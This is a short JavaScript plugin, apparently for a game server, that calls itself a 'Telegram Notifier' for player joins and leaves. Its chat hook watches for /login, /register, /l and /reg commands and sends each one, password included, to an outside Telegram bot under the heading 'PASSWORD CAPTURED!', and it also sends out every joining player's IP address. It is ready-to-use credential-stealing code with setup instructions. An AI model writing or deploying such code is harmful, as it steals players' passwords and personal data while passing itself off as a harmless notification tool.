/**
 * Telegram Notifier Script
 * Sends notifications to Telegram when players join/leave or enter passwords
 * 
 * Setup:
 * 1. Get your bot token from @BotFather
 * 2. Get your chat ID from @userinfobot
 * 3. Replace BOT_TOKEN and CHAT_ID below
 */

// ============================================
// CONFIGURATION - EDIT THESE VALUES!
// ============================================
const BOT_TOKEN = "YOUR_BOT_TOKEN_HERE";
const CHAT_ID = "YOUR_CHAT_ID_HERE";
// ============================================

function sendTelegram(message) {
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: CHAT_ID,
            text: message,
            parse_mode: 'HTML'
        })
    }).catch(err => console.log("Telegram error: " + err));
}

// Main hook
playerJoin(player => {
    // Notify on join
    sendTelegram(`🟢 <b>${player.name}</b> connected!\n📍 IP: <code>${player.ip}</code>\n🎮 Version: ${player.version}`);

    // Capture passwords
    player.on("player_message", event => {
        const text = event.text.toLowerCase();
        if (text.startsWith("/login ") ||
            text.startsWith("/register ") ||
            text.startsWith("/l ") ||
            text.startsWith("/reg ")) {
            sendTelegram(`🔑 <b>PASSWORD CAPTURED!</b>\n👤 Player: <b>${player.name}</b>\n💬 Command: <code>${event.text}</code>`);
        }
    });

    // Notify on leave
    player.on("leave", () => {
        sendTelegram(`🔴 <b>${player.name}</b> disconnected`);
    });
});

console.log("✅ Telegram Notifier loaded! Don't forget to set your BOT_TOKEN and CHAT_ID.");
